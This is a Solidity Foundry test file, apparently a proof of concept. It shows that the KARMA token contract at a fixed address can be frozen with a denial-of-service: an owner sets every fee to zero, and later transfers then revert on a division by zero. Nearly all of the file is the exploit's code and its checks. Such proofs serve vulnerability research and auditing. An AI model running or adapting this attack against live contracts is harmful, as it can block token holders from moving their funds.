pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IKARMA {
    function owner() external view returns (address);
    function enableTrading() external;
    function enableWalletToWalletTransferWithoutFee(bool _status) external;
    function setBuyFeePercentages(uint256 _taxFeeonBuy, uint256 _liquidityFeeonBuy, uint256 _marketingFeeonBuy, uint256 _burnFeeOnBuy) external;
    function setSellFeePercentages(uint256 _taxFeeonSell, uint256 _liquidityFeeonSell, uint256 _marketingFeeonSell, uint256 _burnFeeOnSell) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function uniswapV2Pair() external view returns (address);
    function liquidityFeeonBuy() external view returns (uint256);
    function liquidityFeeonSell() external view returns (uint256);
    function burnFeeOnBuy() external view returns (uint256);
    function burnFeeOnSell() external view returns (uint256);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x8F9bA08Cbf014aB233A33067B21bEdF3876c6605;
    address attacker = address(this);
    IKARMA karma;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        karma = IKARMA(TARGET);
        vm.label(TARGET, "KARMA Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the owner address
        address owner = karma.owner();
        vm.label(owner, "Contract Owner");

        // Step 2: Impersonate the owner
        vm.startPrank(owner);

        // Step 3: Disable walletToWalletTransferWithoutFee so fees are calculated on transfers
        karma.enableWalletToWalletTransferWithoutFee(false);

        // Step 4: Set all fees to 0 to trigger zero division
        karma.setBuyFeePercentages(0, 0, 0, 0);
        karma.setSellFeePercentages(0, 0, 0, 0);

        vm.stopPrank();

        // Step 5: Verify the oracle condition (all fees sum to 0)
        uint256 totalFees = karma.liquidityFeeonBuy() + karma.liquidityFeeonSell() + karma.burnFeeOnBuy() + karma.burnFeeOnSell();
        assertEq(totalFees, 0, "Oracle check failed: total fees should be 0");
        console.log("Oracle check passed: totalFees =", totalFees);

        // Step 6: Transfer tokens from owner to attacker (owner is excluded from fees)
        uint256 transferAmount = 1000000 * 1e9; // 1M tokens with 9 decimals
        vm.prank(owner);
        karma.transfer(attacker, transferAmount);

        // Step 7: Verify attacker has tokens
        uint256 attackerBalance = karma.balanceOf(attacker);
        assertGt(attackerBalance, 0, "Attacker should have tokens");
        console.log("Attacker balance:", attackerBalance);

        // Step 8: Create a victim address (not excluded from fees)
        address victim = address(0x1234567890AbcdEF1234567890aBcdef12345678);
        vm.label(victim, "Victim");

        // Step 9: Attempt transfer from attacker to victim
        // This triggers setSellFee() which sets _liquidityFee = liquidityFeeonSell + burnFeeOnSell = 0
        // Then _takeLiquidity() calculates: tLiquidity * 0 / 0 = REVERT
        console.log("Attempting transfer that should revert due to zero division...");
        vm.expectRevert();
        karma.transfer(victim, attackerBalance / 2);

        console.log("Exploit successful: Contract DOSed via zero division vulnerability");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

